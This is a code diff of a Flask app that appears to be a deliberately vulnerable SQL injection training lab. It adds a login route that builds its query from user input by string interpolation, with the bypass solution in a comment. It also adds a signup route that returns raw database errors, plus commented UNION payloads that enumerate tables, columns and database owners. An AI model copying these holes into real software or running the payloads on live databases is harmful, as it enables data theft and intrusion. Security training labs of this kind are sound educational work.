@@ -3,8 +3,8 @@ import time
 from random import randint
 
 import psycopg2
-from flask import (current_app, jsonify, redirect, render_template, request,
-                   url_for)
+from flask import (current_app, jsonify, redirect, render_template, request, url_for)
+from psycopg2 import errors
 from models import db
 
 
@@ -64,13 +64,17 @@ def init_routes(app):
         username = request.json.get('username')
         password = request.json.get('password')
         
-        conn = psycopg2.connect(app.config['SQLALCHEMY_DATABASE_URI'])
-        cursor = conn.cursor()
-        cursor.execute("INSERT INTO second_order_users (username, password_hash) VALUES (%s, %s)", (username, password))
-        conn.commit()
-        conn.close()
-        
-        return redirect(url_for('second_order_sqli'))
+        try:
+            conn = psycopg2.connect(app.config['SQLALCHEMY_DATABASE_URI'])
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO second_order_users (username, password_hash) VALUES (%s, %s)", (username, password))
+            conn.commit()
+            conn.close()
+            return redirect(url_for('second_order_sqli'))
+        except errors.UniqueViolation as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
+        except errors.UniqueViolation as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
     
     @app.route('/login', methods=['POST'])
     def login():
@@ -124,3 +128,54 @@ def init_routes(app):
                 return jsonify({"status": "success", "message": "Out-of-Band SQL Injection executed"}), 200
             return jsonify({"status": "error", "message": "No data provided"}), 400
         return render_template('out_of_band_sqli.html')
+    
+    @app.route('/error_based_sqli')
+    def error_based_sqli():
+        return render_template('error_based_sqli.html')
+
+    @app.route('/signup_error', methods=['POST'])
+    def signup_error():
+        username = request.json.get('username')
+        password = request.json.get('password')
+        
+        try:
+            conn = psycopg2.connect(app.config['SQLALCHEMY_DATABASE_URI'])
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO second_order_users (username, password_hash) VALUES (%s, %s)", (username, password))
+            conn.commit()
+            conn.close()
+            return redirect(url_for('second_order_sqli'))
+        except psycopg2.Error as e:
+            print(e.pgerror)
+            # print(e.pgcode)
+            return jsonify({"message": "Wiesz coś więcej o bazie danych?", "feedback": e.pgerror}), 400
+
+    @app.route('/error_login', methods=['POST'])
+    def error_login():
+        username = request.json.get('username')
+        password = request.json.get('password')
+        
+        conn = psycopg2.connect(app.config['SQLALCHEMY_DATABASE_URI'])
+        cursor = conn.cursor()
+        
+        query = f"SELECT * FROM second_order_users WHERE password_hash = '{password}' AND username = '{username}'"    # solution: username' OR '''' = '''
+        cursor.execute(query)
+        result = cursor.fetchall()
+        print(result)
+        if not result:
+            return jsonify({"message": "Wiesz coś więcej o bazie danych?", "feedback": "Brak użytkownika o podanych danych"}), 200
+        return jsonify({"message": "Wiesz coś więcej o bazie danych?", "feedback": f"Żądany użytkownik: {result}"}), 200
+
+# UNION 
+# SELECT 1, table_name, column_name 
+# FROM information_schema.columns 
+# WHERE table_schema = 'public';
+
+# ' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema = 'public'; --
+
+# ' UNION SELECT 1, current_database(), column_name, FROM information_schema.columns WHERE table_schema = 'public'; --
+
+#' UNION SELECT 1, datname, pg_catalog.pg_get_userbyid(datdba) AS owner FROM pg_database; --
+
+# ' UNION SELECT inet_client_port(), 'd', 'd'; --
+
